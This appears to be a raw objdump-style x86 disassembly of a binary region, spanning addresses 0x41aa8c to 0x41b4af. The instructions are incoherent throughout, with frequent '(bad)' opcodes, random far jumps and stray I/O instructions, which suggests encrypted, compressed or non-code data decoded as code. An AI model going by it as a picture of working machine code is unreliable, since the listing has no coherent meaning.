  41aa8c:	imul   edx,DWORD PTR [ecx-0x15],0x66
  41aa90:	add    eax,0x8d92044e
  41aa95:	fwait
  41aa96:	dec    ecx
  41aa97:	sbb    ah,ah
  41aa99:	push   0x67dca2c7
  41aa9e:	imul   BYTE PTR [ecx]
  41aaa0:	sub    al,0x45
  41aaa2:	xchg   esp,eax
  41aaa3:	sbb    DWORD PTR [ebp-0x54],0x12
  41aaa7:	das    
  41aaa8:	xlat   BYTE PTR ds:[ebx]
  41aaa9:	sub    edx,DWORD PTR [edx+edx*1+0x30c5131c]
  41aab0:	jle    0x41aa87
  41aab2:	jmp    0x4864b5fd
  41aab7:	std    
  41aab8:	fs gs xor al,0x9f
  41aabc:	ret    
  41aabd:	mov    ebp,0x8daaba1f
  41aac3:	fadd   DWORD PTR [esi-0x45a7e2c8]
  41aac9:	jb     0x41aaad
  41aacb:	mov    eax,0x81138cb4
  41aad0:	pop    ecx
  41aad1:	setbe  BYTE PTR [edi+0x399f2746]
  41aad8:	mov    edi,0xd06652c4
  41aadd:	dec    ebx
  41aade:	inc    ebp
  41aadf:	sahf   
  41aae0:	adc    al,BYTE PTR [edx-0x4bee94ae]
  41aae6:	mov    ?,WORD PTR [ecx+0x27fb7fae]
  41aaec:	add    DWORD PTR [eax],ebx
	...
  41ab56:	test   DWORD PTR [ecx],0xfdfeb4dc
  41ab5c:	inc    DWORD PTR [ebx+0x5f]
  41ab5f:	sbb    BYTE PTR [esi+0x43],ah
  41ab62:	jb     0x41ab4e
  41ab64:	xor    edx,ebp
  41ab66:	addr16 pop ds
  41ab68:	add    DWORD PTR [eax],eax
  41ab6a:	add    BYTE PTR [ecx],al
  41ab6c:	add    BYTE PTR [eax],al
  41ab6e:	(bad)  
  41ab6f:	jle    0x41ab6f
  41ab71:	xchg   esi,eax
  41ab72:	loop   0x41abce
  41ab74:	and    al,0x66
  41ab76:	dec    ecx
  41ab77:	xchg   edx,eax
  41ab78:	dec    ebx
  41ab79:	jecxz  0x41ab5d
  41ab7b:	popa   
  41ab7c:	mov    bl,0xe2
  41ab7e:	icebp  
  41ab7f:	(bad)  
  41ab81:	push   eax
  41ab82:	inc    ecx
  41ab83:	jl     0x41ab5b
  41ab85:	popa   
  41ab86:	outs   dx,DWORD PTR ds:[esi]
  41ab87:	mov    bh,0x2a
  41ab89:	mov    al,ds:0xca204343
  41ab8e:	jne    0x41ab3e
  41ab90:	push   ds
  41ab91:	and    bh,bl
  41ab93:	add    DWORD PTR [ebp-0x7c],edi
  41ab96:	add    bl,dh
  41ab98:	ins    BYTE PTR es:[edi],dx
  41ab99:	cdq    
  41ab9a:	jo     0x41ab65
  41ab9c:	cwde   
  41ab9d:	icebp  
  41ab9e:	jmp    0x62fe:0x85210f72
  41aba5:	push   0x37880c2a
  41abaa:	and    al,BYTE PTR [edi+0x21]
  41abad:	ins    DWORD PTR es:[edi],dx
  41abae:	adc    DWORD PTR [edi+ebx*2-0x1813fa3],edx
  41abb5:	mov    ?,WORD PTR [ecx-0x1f]
  41abb8:	sar    BYTE PTR [edi],1
  41abba:	or     BYTE PTR [edi],0x14
  41abbd:	pop    ebx
  41abbe:	cwde   
  41abbf:	or     DWORD PTR [ebx-0x49],eax
  41abc2:	fbld   TBYTE PTR [ebp+0x2f]
  41abc5:	xchg   ebp,eax
  41abc6:	sti    
  41abc7:	jecxz  0x41ab7c
  41abc9:	fmul   DWORD PTR [ebp+0x57]
  41abcc:	in     eax,0xee
  41abce:	das    
  41abcf:	in     al,dx
  41abd0:	loope  0x41ab92
  41abd2:	sbb    DWORD PTR [eax],edx
  41abd4:	lahf   
  41abd5:	loope  0x41ac43
  41abd7:	outs   dx,BYTE PTR ds:[esi]
  41abd8:	fnsave [eax-0x604f0298]
  41abde:	mov    bh,0x37
  41abe0:	mov    bh,0xc2
  41abe2:	(bad)  
  41abe3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41abe4:	mov    bh,0xc8
  41abe6:	sub    bh,BYTE PTR [edi]
  41abe8:	in     al,dx
  41abe9:	sti    
  41abea:	push   es
  41abeb:	aam    0x57
  41abed:	retf   0xa66c
  41abf0:	sbb    DWORD PTR [ecx-0x21ae2316],ecx
  41abf6:	fwait
  41abf7:	cmp    eax,0x73af298
  41abfc:	cmp    BYTE PTR [ecx-0x2e],ah
  41abff:	stos   DWORD PTR es:[edi],eax
  41ac00:	lea    ebp,[ecx]
  41ac02:	sub    DWORD PTR [esp+ebp*1],edi
  41ac05:	push   eax
  41ac06:	bound  eax,QWORD PTR [ebx-0x3becc705]
  41ac0c:	sbb    eax,ebx
  41ac0e:	jmp    0x29ad:0xc3d8584a
  41ac15:	push   edi
  41ac16:	mov    dl,BYTE PTR [ebp*1+0x7ed65e62]
  41ac1d:	sub    DWORD PTR [esi+0x29e861c0],esi
  41ac23:	imul   ebx,ebp,0x3d
  41ac26:	dec    esi
  41ac27:	cmp    al,0x43
  41ac29:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ac2a:	sub    cl,cl
  41ac2c:	push   eax
  41ac2d:	test   BYTE PTR [ecx-0x2a7c8d54],0x62
  41ac34:	add    DWORD PTR [edi-0x2fd074e1],0xffffffd2
  41ac3b:	aad    0xf8
  41ac3d:	xor    BYTE PTR [edi],dl
  41ac3f:	push   ss
  41ac40:	int    0x62
  41ac42:	pop    edx
  41ac43:	test   eax,0x6ecf4006
  41ac48:	fadd   DWORD PTR [ecx-0xce409b1]
  41ac4e:	inc    ebx
  41ac4f:	lods   al,BYTE PTR ds:[esi]
  41ac50:	inc    edx
  41ac51:	xor    al,0x34
  41ac53:	adc    eax,0x62870ced
  41ac58:	inc    eax
  41ac5a:	nop
  41ac5b:	addr16 dec edi
  41ac5d:	push   esp
  41ac5e:	enter  0x22b5,0xb9
  41ac62:	and    bh,BYTE PTR [ebx]
  41ac64:	imul   BYTE PTR [ebp-0x59f66d07]
  41ac6a:	mov    BYTE PTR [ebp+0x457d],al
	...
  41acd4:	add    BYTE PTR [eax],al
  41acd6:	push   0x49
  41acd8:	es cmp al,0x27
  41acdb:	jg     0x41ad57
  41acdd:	pop    edi
  41acde:	or     al,0x44
  41ace0:	xor    ah,BYTE PTR [ebp+ebx*8-0x23]
  41ace4:	mov    ebx,0x1206754
  41ace9:	add    BYTE PTR [eax],al
  41aceb:	add    DWORD PTR [eax],eax
  41aced:	add    BYTE PTR [ecx+0x22],al
  41acf0:	push   ebp
  41acf1:	adc    ecx,DWORD PTR [ecx+eiz*8-0x68]
  41acf5:	jns    0x41ad6a
  41acf7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41acf8:	adc    esi,DWORD PTR [edi+edx*4-0x31f3c63d]
  41acff:	loop   0x41ad3a
  41ad01:	mov    ecx,0x730d55bd
  41ad06:	mov    esp,0x341a4639
  41ad0b:	leave  
  41ad0c:	xor    DWORD PTR [ecx-0x7a],edx
  41ad0f:	sbb    BYTE PTR [edx+0x66473597],al
  41ad15:	jnp    0x41ad46
  41ad17:	sar    DWORD PTR [esi-0x60],0x83
  41ad1b:	push   esi
  41ad1c:	jg     0x41ad31
  41ad1e:	or     dh,BYTE PTR [edi]
  41ad20:	add    ch,BYTE PTR [ecx]
  41ad22:	enter  0xde73,0x65
  41ad26:	inc    edx
  41ad27:	loopne 0x41ad37
  41ad29:	jmp    0x41ad9c
  41ad2b:	and    esi,ecx
  41ad2d:	xchg   ecx,eax
  41ad2e:	xchg   BYTE PTR [ecx],dh
  41ad30:	call   0xda68:0x1c611657
  41ad37:	or     al,0x7f
  41ad39:	lahf   
  41ad3a:	xchg   esi,eax
  41ad3b:	mov    ebx,ecx
  41ad3d:	or     bl,BYTE PTR [edx+0x26]
  41ad40:	stos   BYTE PTR es:[edi],al
  41ad41:	dec    edi
  41ad42:	mov    WORD PTR [edx],?
  41ad44:	lods   al,BYTE PTR ds:[esi]
  41ad45:	push   esp
  41ad46:	lea    esp,[edi+ebp*2]
  41ad49:	iret   
  41ad4a:	or     al,0x93
  41ad4c:	add    BYTE PTR [ecx],dl
  41ad4e:	call   0x534c:0x2c4df704
  41ad55:	mov    ecx,0x1dc93c86
  41ad5a:	es mov edi,0x32f9ee59
  41ad60:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ad61:	lods   al,BYTE PTR ds:[esi]
  41ad62:	xchg   DWORD PTR [ecx],eax
  41ad64:	pop    esi
  41ad65:	jb     0x41ad0b
  41ad67:	stc    
  41ad68:	mov    DWORD PTR [eax],esi
  41ad6a:	(bad)  
  41ad6b:	hlt    
  41ad6c:	sbb    BYTE PTR [bx+di],al
  41ad6f:	rol    ah,cl
  41ad71:	enter  0xeb61,0x80
  41ad75:	pop    ebp
  41ad76:	mul    dl
  41ad78:	cmc    
  41ad79:	hlt    
  41ad7a:	(bad)  [ebx+0x620f43d1]
  41ad80:	mov    esi,0x5e8bbca5
  41ad85:	(bad)
  41ad88:	push   esi
  41ad89:	mov    edx,0xf2215afd
  41ad8e:	in     al,0xd
  41ad90:	xchg   BYTE PTR [esp+eax*8],ah
  41ad93:	xchg   sp,ax
  41ad95:	mov    edi,0x5a701c5
  41ad9a:	sbb    bh,BYTE PTR [edi+0x2e]
  41ad9d:	gs xor eax,0x50ced542
  41ada3:	sbb    BYTE PTR [edx],dh
  41ada5:	cmp    eax,0x7a09be51
  41adaa:	(bad)  
  41adab:	push   esp
  41adac:	fcomp  QWORD PTR [ebp-0x263b1c9d]
  41adb2:	adc    eax,0xb0710695
  41adb7:	adc    cl,ch
  41adb9:	or     al,0x29
  41adbb:	and    ecx,ecx
  41adbd:	div    DWORD PTR [esi+0x77d08533]
  41adc3:	jmp    0x1bf0f12c
  41adc8:	push   ecx
  41adc9:	mov    eax,ds:0xd049a170
  41adce:	or     ecx,DWORD PTR [ecx]
  41add0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41add1:	cmp    DWORD PTR [ebp-0x44a73f3d],edi
  41add7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41add8:	out    dx,al
  41add9:	jp     0x41adae
  41addb:	xchg   BYTE PTR [eax-0x1c8cb305],bl
  41ade1:	in     al,dx
  41ade2:	jne    0x41adf9
  41ade4:	jb     0x41add1
  41ade6:	idiv   DWORD PTR [ecx+0x13]
  41ade9:	rol    DWORD PTR [ebx+0x6e],cl
  41adec:	cmp    BYTE PTR [eax+0x0],ah
	...
  41ae56:	push   ebp
  41ae57:	clc    
  41ae58:	or     DWORD PTR [esi-0x4280053],ebx
  41ae5e:	dec    edi
  41ae5f:	push   eax
  41ae60:	cmp    DWORD PTR [eax+ecx*8+0x67e1005e],esp
  41ae67:	and    DWORD PTR [ecx],eax
  41ae69:	add    BYTE PTR [eax],al
  41ae6b:	add    DWORD PTR [eax],eax
  41ae6d:	add    dh,cl
  41ae6f:	out    0xc6,eax
  41ae71:	xor    eax,0xec647dc8
  41ae76:	mov    DWORD PTR [ebx+0x1f8be1a7],edi
  41ae7c:	push   ss
  41ae7d:	fdiv   QWORD PTR [esi+0x37]
  41ae80:	test   DWORD PTR [edx+ecx*2-0x92a0ace],ebx
  41ae87:	push   ecx
  41ae88:	xchg   ebx,eax
  41ae89:	add    BYTE PTR [esi+eax*2-0x6b635397],cl
  41ae90:	pop    ecx
  41ae91:	test   BYTE PTR [edi-0x3a44dfa3],0xb0
  41ae98:	and    eax,0x833a3fea
  41ae9d:	popf   
  41ae9e:	jbe    0x41aee0
  41aea0:	(bad)  
  41aea1:	xor    DWORD PTR [edx-0xd],esi
  41aea4:	imul   edx,edi,0x55e811d5
  41aeaa:	adc    eax,0x4321ddd2
  41aeaf:	cmp    DWORD PTR [esi],edi
  41aeb1:	sbb    dl,BYTE PTR [ecx+0x3e]
  41aeb4:	add    esp,DWORD PTR [edi]
  41aeb6:	pop    eax
  41aeb7:	fsub   QWORD PTR [ebx+0x26]
  41aeba:	in     al,dx
  41aebb:	push   ds
  41aebc:	dec    ecx
  41aebd:	(bad)  
  41aebf:	shl    BYTE PTR [esp+eiz*4],cl
  41aec2:	es aam 0x3d
  41aec5:	push   edx
  41aec6:	test   al,0x55
  41aec8:	(bad)  
  41aec9:	jmp    0x41aef5
  41aecb:	push   ecx
  41aecc:	test   ah,0x46
  41aecf:	clc    
  41aed0:	lahf   
  41aed1:	fwait
  41aed2:	jl     0x41af16
  41aed4:	das    
  41aed5:	pop    edx
  41aed6:	mov    ah,0xbb
  41aed8:	shr    DWORD PTR [edx+edi*2-0xc],cl
  41aedc:	enter  0x54da,0x45
  41aee0:	repnz imul edi,DWORD PTR [edi],0xffffffe3
  41aee4:	xchg   esp,eax
  41aee5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41aee6:	loopne 0x41aee4
  41aee8:	dec    esp
  41aee9:	mov    bh,BYTE PTR [ecx-0x55]
  41aeec:	loop   0x41af18
  41aeee:	(bad)  
  41aeef:	fcom   QWORD PTR [ebx]
  41aef1:	push   edx
  41aef2:	jbe    0x41af53
  41aef4:	or     eax,ecx
  41aef6:	add    al,0x6f
  41aef8:	ret    0x9d80
  41aefb:	jp     0x41aeaf
  41aefd:	popa   
  41aefe:	and    BYTE PTR [ebp-0x20],0x71
  41af02:	sbb    al,0xea
  41af04:	mov    ebx,0x2e841d43
  41af09:	inc    eax
  41af0a:	push   ecx
  41af0b:	pop    edx
  41af0c:	adc    eax,0xdf9c579a
  41af11:	dec    esi
  41af12:	add    DWORD PTR [ebx],eax
  41af14:	mov    edx,0xcaaef673
  41af19:	dec    edi
  41af1a:	(bad)  
  41af1b:	icebp  
  41af1c:	ficom  WORD PTR [ebx+0x75282d90]
  41af22:	cwde   
  41af23:	nop
  41af24:	inc    ebx
  41af25:	sub    bl,BYTE PTR [ecx+0x1396cfd1]
  41af2b:	adc    eax,0xd48ff434
  41af30:	pop    ss
  41af31:	mov    ds,WORD PTR [ebx+edi*2]
  41af34:	pop    ebp
  41af35:	jecxz  0x41aec9
  41af37:	call   ecx
  41af39:	mov    ds:0xd9310aa,al
  41af3e:	inc    ebp
  41af3f:	jne    0x41af73
  41af41:	popa   
  41af42:	or     DWORD PTR [edi-0x72],0xffffffbb
  41af46:	loopne 0x41afb5
  41af48:	inc    ebp
  41af49:	gs inc esi
  41af4b:	ret    
  41af4c:	and    eax,0x7a79d68b
  41af51:	dec    edx
  41af52:	xchg   ebp,eax
  41af53:	sbb    al,0x80
  41af55:	popf   
  41af56:	jnp    0x41afd1
  41af58:	jl     0x41af1b
  41af5a:	arpl   WORD PTR [edi-0xe9b4ae0],di
  41af60:	loop   0x41afa3
  41af62:	jo     0x41af5f
  41af64:	stos   BYTE PTR es:[edi],al
  41af65:	mov    al,0x92
  41af67:	push   es
  41af68:	dec    ebp
  41af69:	inc    esi
  41af6a:	mov    ebx,0x5aec20
	...
  41afd3:	add    BYTE PTR [eax],al
  41afd5:	add    ch,al
  41afd7:	stc    
  41afd8:	lods   eax,DWORD PTR ds:[esi]
  41afd9:	xor    edi,DWORD PTR [ebp+0x15ffdf77]
  41afdf:	mov    ecx,0x82a144ee
  41afe4:	xor    edi,ecx
  41afe6:	and    al,BYTE PTR [bx+di]
  41afe9:	add    BYTE PTR [eax],al
  41afeb:	add    DWORD PTR [eax],eax
  41afed:	add    BYTE PTR [edx],al
  41afef:	sub    BYTE PTR [edx+0x275b3d9],0x8e
  41aff6:	neg    DWORD PTR [edx]
  41aff8:	mov    edi,0xf64da7e3
  41affd:	mov    DWORD PTR [edx],eax
  41afff:	cs int 0x15
  41b002:	sbb    cl,dh
  41b004:	das    
  41b005:	gs out dx,al
  41b007:	cmp    DWORD PTR [edi+edx*2+0x0],edx
  41b00b:	out    0xd9,al
  41b00d:	xlat   BYTE PTR ds:[ebx]
  41b00e:	js     0x41b008
  41b010:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b011:	inc    ecx
  41b012:	out    0x66,eax
  41b014:	mov    ebp,DWORD PTR [ecx+0x6f]
  41b017:	cs nop
  41b019:	scas   eax,DWORD PTR es:[edi]
  41b01a:	loope  0x41b035
  41b01c:	inc    ebx
  41b01d:	xchg   esp,eax
  41b01e:	imul   ebp,DWORD PTR [ebp+0x52323c3f],0x8e0b06a3
  41b028:	out    0xd1,eax
  41b02a:	std    
  41b02b:	mov    ecx,0x7227555b
  41b030:	jno    0x41aff9
  41b032:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b033:	adc    al,0x65
  41b035:	cmp    al,0x46
  41b037:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b038:	mov    ah,0x4f
  41b03a:	cmp    DWORD PTR [edi+0x60],esi
  41b03d:	data16 icebp 
  41b03f:	ins    BYTE PTR es:[edi],dx
  41b040:	mov    ss,WORD PTR [edi+0x66556bf7]
  41b046:	adc    BYTE PTR [esi+0x49],0x7d
  41b04a:	xor    eax,0x4f5a42c7
  41b04f:	dec    ebx
  41b050:	and    DWORD PTR [edx],ebx
  41b052:	sti    
  41b053:	jnp    0x41afd9
  41b055:	jns    0x41b01b
  41b057:	dec    eax
  41b058:	fwait
  41b059:	mov    esp,0xeae06007
  41b05e:	shl    BYTE PTR [edi],cl
  41b060:	mov    ebx,0x774762b0
  41b065:	cli    
  41b066:	(bad)  
  41b067:	mov    edx,0x541008b4
  41b06c:	pop    esp
  41b06d:	jle    0x41b029
  41b06f:	mov    ds:0x7c895055,eax
  41b074:	jmp    FWORD PTR [eax+0x2b]
  41b077:	push   edi
  41b078:	retf   0x3ef1
  41b07b:	rcl    BYTE PTR [eax-0x10d2af0a],1
  41b081:	add    eax,0x7c147db2
  41b087:	add    ch,bl
  41b089:	pop    ebp
  41b08a:	addr16 js 0x41b0b4
  41b08d:	fldcw  WORD PTR [edi]
  41b08f:	jb     0x41b064
  41b091:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b092:	xlat   BYTE PTR ds:[ebx]
  41b093:	jbe    0x41b107
  41b095:	pop    eax
  41b096:	or     BYTE PTR [eax],bl
  41b098:	adc    eax,0xcfa97412
  41b09d:	and    ebx,DWORD PTR [esi-0x573d17ae]
  41b0a3:	mov    fs,WORD PTR [esi+0x67]
  41b0a6:	out    0x64,eax
  41b0a8:	js     0x41b0f4
  41b0aa:	push   0x3d47c6cd
  41b0af:	ins    DWORD PTR es:[edi],dx
  41b0b0:	mov    WORD PTR [ecx-0x87b2040],ds
  41b0b6:	mov    BYTE PTR [edx+0x3d],bh
  41b0b9:	pop    es
  41b0ba:	popf   
  41b0bb:	stos   DWORD PTR es:[edi],eax
  41b0bc:	push   es
  41b0bd:	ja     0x41b087
  41b0bf:	or     eax,0xe57f8f9
  41b0c4:	mov    BYTE PTR [edi+0x35534865],cl
  41b0ca:	sub    eax,0x47d2368
  41b0cf:	pop    edi
  41b0d0:	(bad)  
  41b0d1:	lods   eax,DWORD PTR ds:[esi]
  41b0d2:	fwait
  41b0d3:	sbb    BYTE PTR [ebx-0x388dafbf],bh
  41b0d9:	inc    esi
  41b0da:	imul   ebx,DWORD PTR [ebx-0x7e],0xbf4de129
  41b0e1:	dec    esi
  41b0e2:	xchg   edx,eax
  41b0e3:	into   
  41b0e4:	mov    ds:0x451cce74,al
  41b0e9:	aad    0xdd
  41b0eb:	test   BYTE PTR [esi],0xbd
	...
  41b156:	(bad)  
  41b157:	ficom  WORD PTR [eax]
  41b159:	stos   DWORD PTR es:[edi],eax
  41b15a:	sbb    bh,ch
  41b15c:	(bad)  
  41b15d:	call   DWORD PTR [edx+edx*8+0x75]
  41b161:	mov    edi,0x5d949b32
  41b166:	and    eax,DWORD PTR [bx+di]
  41b169:	add    BYTE PTR [eax],al
  41b16b:	add    DWORD PTR [eax],eax
  41b16d:	add    BYTE PTR [ebx-0x2a],bh
  41b170:	jp     0x41b132
  41b172:	sub    ah,BYTE PTR ds:0xc3899e6d
  41b178:	fstp   DWORD PTR [edi+0x4c]
  41b17b:	jmp    0xa442:0x42905d61
  41b182:	cmp    DWORD PTR [esi-0x21],0x4f0f3565
  41b189:	push   0x96157fc1
  41b18e:	cwde   
  41b18f:	mov    DWORD PTR [ecx],esi
  41b191:	xchg   ebp,eax
  41b192:	xor    edx,DWORD PTR [ecx]
  41b194:	leave  
  41b195:	(bad)  
  41b196:	arpl   WORD PTR [edi],si
  41b198:	(bad)  
  41b199:	push   edi
  41b19a:	mov    edi,0xebe1c35d
  41b19f:	dec    ebx
  41b1a0:	and    eax,0x67f64d98
  41b1a5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b1a6:	sahf   
  41b1a7:	push   eax
  41b1a8:	scas   al,BYTE PTR es:[edi]
  41b1a9:	mov    dl,BYTE PTR [esi+0x57c3f36f]
  41b1af:	mov    eax,ds:0x1292aef2
  41b1b4:	mov    dh,0xd8
  41b1b6:	lock scas al,BYTE PTR es:[edi]
  41b1b8:	mov    esp,ebx
  41b1ba:	adc    al,0x49
  41b1bc:	cmp    ecx,DWORD PTR [edx]
  41b1be:	pop    ebx
  41b1bf:	fbstp  TBYTE PTR [edi]
  41b1c1:	pop    edi
  41b1c2:	imul   edx,DWORD PTR [ecx+0x78940fe0],0x73
  41b1c9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b1ca:	cmp    BYTE PTR [ebp-0x57],dl
  41b1cd:	inc    ebx
  41b1ce:	jmp    0x41b24f
  41b1d0:	aam    0x9c
  41b1d2:	lods   eax,DWORD PTR ds:[esi]
  41b1d3:	(bad)  
  41b1d4:	jne    0x41b183
  41b1d6:	xor    DWORD PTR [esi],ebx
  41b1d8:	sbb    DWORD PTR [ebp-0xe],edx
  41b1db:	mov    dl,0xd0
  41b1dd:	mov    ?,WORD PTR [ebx]
  41b1df:	adc    DWORD PTR [edx],ebp
  41b1e1:	cmc    
  41b1e2:	out    0x72,eax
  41b1e4:	(bad)  
  41b1e5:	aad    0x39
  41b1e7:	sbb    bl,BYTE PTR [esi+0x42]
  41b1ea:	cld    
  41b1eb:	lahf   
  41b1ec:	and    al,0x97
  41b1ee:	push   0x41
  41b1f0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b1f1:	mov    edx,fs
  41b1f3:	adc    BYTE PTR [ebp-0x5724445f],ch
  41b1f9:	jno    0x41b1a8
  41b1fb:	pop    ecx
  41b1fc:	pop    esp
  41b1fd:	les    edi,FWORD PTR [ecx+0xcf5706d]
  41b203:	mov    bh,BYTE PTR [ebx]
  41b205:	hlt    
  41b206:	mov    edi,DWORD PTR [ebx-0x1bb68f63]
  41b20c:	sar    BYTE PTR [ebp-0x2ee96e8d],0x51
  41b213:	add    esp,edi
  41b215:	mov    bh,0xa
  41b217:	ds mov ebp,0x6dfb533
  41b21d:	inc    ebp
  41b21e:	in     al,dx
  41b21f:	or     ah,BYTE PTR [edi+0x44]
  41b222:	mov    esp,0xbe7475a4
  41b227:	ror    DWORD PTR [esi+0x67],0x6f
  41b22b:	xchg   edi,eax
  41b22c:	lds    ecx,FWORD PTR [edx-0x70]
  41b22f:	sub    eax,0x294eae5f
  41b234:	mov    DWORD PTR [edi-0x3],ecx
  41b237:	lods   eax,DWORD PTR ds:[esi]
  41b238:	bound  eax,QWORD PTR [esi]
  41b23a:	out    0x1e,al
  41b23c:	and    eax,0x4690771e
  41b241:	clc    
  41b242:	mov    esi,0xb4cddc01
  41b247:	mov    esp,0xf3821182
  41b24c:	(bad)  
  41b24d:	sbb    eax,0xbbe9fcfd
  41b252:	loopne 0x41b215
  41b254:	push   cs
  41b255:	cmp    BYTE PTR [esi],ch
  41b257:	inc    ebp
  41b258:	pop    ss
  41b259:	inc    edx
  41b25a:	xchg   edx,eax
  41b25b:	stos   DWORD PTR es:[edi],eax
  41b25c:	test   eax,esi
  41b25e:	cwde   
  41b25f:	call   0xcb2e8b4a
  41b264:	inc    ecx
  41b265:	fistp  WORD PTR ds:0x1ade016b
  41b26b:	in     al,dx
  41b26c:	sub    esi,edx
	...
  41b2d6:	mov    fs,WORD PTR [ebp-0x13941f97]
  41b2dc:	(bad)  
  41b2dd:	out    dx,eax
  41b2de:	stos   BYTE PTR es:[edi],al
  41b2df:	jge    0x41b27c
  41b2e1:	or     BYTE PTR [edi+esi*1+0x24671df5],al
  41b2e8:	add    DWORD PTR [eax],eax
  41b2ea:	add    BYTE PTR [ecx],al
  41b2ec:	add    BYTE PTR [eax],al
  41b2ee:	icebp  
  41b2ef:	shr    BYTE PTR [eax-0x6f98874e],0x52
  41b2f6:	mov    ecx,0xc6581faa
  41b2fb:	or     dl,al
  41b2fd:	xchg   ebp,eax
  41b2fe:	fdivr  QWORD PTR [ecx-0x4]
  41b301:	ins    BYTE PTR es:[edi],dx
  41b302:	push   edx
  41b303:	mov    ch,0x74
  41b305:	ret    0x1a1d
  41b308:	iret   
  41b309:	(bad)  
  41b30a:	std    
  41b30b:	mov    edx,0xb18824c1
  41b310:	push   eax
  41b311:	aaa    
  41b312:	lock mov dl,0x28
  41b315:	push   ecx
  41b316:	mov    ch,BYTE PTR [ecx]
  41b318:	(bad)  
  41b319:	out    dx,eax
  41b31a:	jg     0x41b307
  41b31c:	les    ebp,FWORD PTR [edx+0x5ac73c67]
  41b322:	inc    edx
  41b323:	leave  
  41b324:	scas   eax,DWORD PTR es:[edi]
  41b325:	sbb    ah,BYTE PTR [esp+edx*4+0x7b]
  41b329:	js     0x41b370
  41b32b:	test   eax,0x5ac555b0
  41b330:	sub    ch,BYTE PTR [edx+0x377dc61c]
  41b336:	pop    ecx
  41b337:	xor    dh,dl
  41b339:	push   ss
  41b33a:	jmp    0x827e:0xc77e918b
  41b341:	dec    ebx
  41b342:	ins    BYTE PTR es:[edi],dx
  41b343:	dec    edi
  41b344:	jmp    0xff6fd5c5
  41b349:	inc    edi
  41b34a:	in     al,0x18
  41b34c:	xchg   edi,eax
  41b34d:	jl     0x41b336
  41b34f:	into   
  41b350:	call   0xb9005a7d
  41b355:	enter  0x1dd3,0x35
  41b359:	lock jecxz 0x41b2f5
  41b35c:	shl    BYTE PTR [esi+eax*4-0xf0f6baf],cl
  41b363:	sti    
  41b364:	adc    bh,BYTE PTR [eax+0x63]
  41b367:	jmp    0x41b332
  41b369:	or     DWORD PTR [edi+0x58],esp
  41b36c:	pop    ds
  41b36d:	jg     0x41b387
  41b36f:	jge    0x41b37e
  41b371:	push   esp
  41b372:	xchg   edx,eax
  41b373:	pop    ds
  41b374:	jae    0x41b3ed
  41b376:	sbb    al,0x3
  41b378:	jl     0x41b390
  41b37a:	lods   al,BYTE PTR ds:[esi]
  41b37b:	jns    0x41b38a
  41b37d:	mov    bl,0xdf
  41b37f:	popa   
  41b380:	sub    al,0x5b
  41b382:	adc    al,0x52
  41b384:	mov    bh,0x5a
  41b386:	(bad)  
  41b387:	cmovs  eax,DWORD PTR [edx+edx*4-0x1e181735]
  41b38f:	xor    BYTE PTR [eax-0x7e],cl
  41b392:	push   ecx
  41b393:	lods   al,BYTE PTR ds:[esi]
  41b394:	adc    DWORD PTR [edx],0xffffff81
  41b397:	sbb    eax,0x13077d
  41b39c:	and    edi,DWORD PTR [eax+ebp*8]
  41b39f:	push   0x2f
  41b3a1:	sub    ch,BYTE PTR [ebx+esi*4-0xf]
  41b3a5:	les    ebx,FWORD PTR [ebx]
  41b3a7:	dec    esi
  41b3a8:	je     0x41b398
  41b3aa:	sbb    esp,DWORD PTR [edi-0x665b452b]
  41b3b0:	add    DWORD PTR [ecx],eax
  41b3b2:	pop    ds
  41b3b3:	je     0x41b3fd
  41b3b5:	(bad)  
  41b3b6:	repnz xchg ebx,eax
  41b3b8:	push   edx
  41b3b9:	leave  
  41b3ba:	cmp    al,0xcf
  41b3bc:	mov    bh,0xbd
  41b3be:	xor    BYTE PTR [edi+eiz*4+0x6408165],0x82
  41b3c6:	inc    edx
  41b3c7:	add    al,0xf4
  41b3c9:	add    eax,0x2368ab66
  41b3ce:	adc    eax,0xd03b72
  41b3d3:	in     eax,0x74
  41b3d5:	stos   BYTE PTR es:[edi],al
  41b3d6:	shr    ebp,1
  41b3d8:	adc    cl,BYTE PTR [esi]
  41b3da:	aam    0x77
  41b3dc:	gs pop ds
  41b3de:	jle    0x41b3af
  41b3e0:	enter  0x435c,0xe4
  41b3e4:	ja     0x41b45b
  41b3e6:	dec    eax
  41b3e7:	sbb    BYTE PTR [esi-0x5],ah
  41b3ea:	xchg   BYTE PTR [edx+eiz*8+0x42],cl
	...
  41b455:	add    BYTE PTR [eax+0xd],cl
  41b458:	sbb    eax,0xfebb5dab
  41b45d:	out    dx,eax
  41b45e:	xchg   ebp,eax
  41b45f:	iret   
  41b460:	push   ebx
  41b461:	aas    
  41b462:	rcr    BYTE PTR [esi+0x6f],0x9a
  41b466:	addr16 and eax,0x1000001
  41b46c:	add    BYTE PTR [eax],al
  41b46e:	dec    edx
  41b46f:	adc    DWORD PTR [ecx+0x27],0x33
  41b473:	jns    0x41b410
  41b475:	out    dx,al
  41b476:	mov    eax,ds:0xef397118
  41b47b:	inc    ecx
  41b47c:	cld    
  41b47d:	test   eax,0xc7a7e658
  41b482:	mov    ch,0x32
  41b484:	test   al,0x5f
  41b486:	fs test eax,0x39e66f4f
  41b48c:	push   edi
  41b48d:	sbb    ecx,DWORD PTR [ecx-0x3b39001d]
  41b493:	xchg   edx,esp
  41b495:	data16 ins BYTE PTR es:[edi],dx
  41b497:	retf   0xad23
  41b49a:	in     eax,0x73
  41b49c:	cmp    BYTE PTR [ebx+eiz*2-0x13],al
  41b4a0:	shl    ebx,cl
  41b4a2:	add    bh,cl
  41b4a4:	jp     0x41b432
  41b4a6:	jmp    0x41b51a
  41b4a8:	loopne 0x41b43f
  41b4aa:	mov    ecx,0xf28f888
  41b4af:	fcmovu st,st(6)
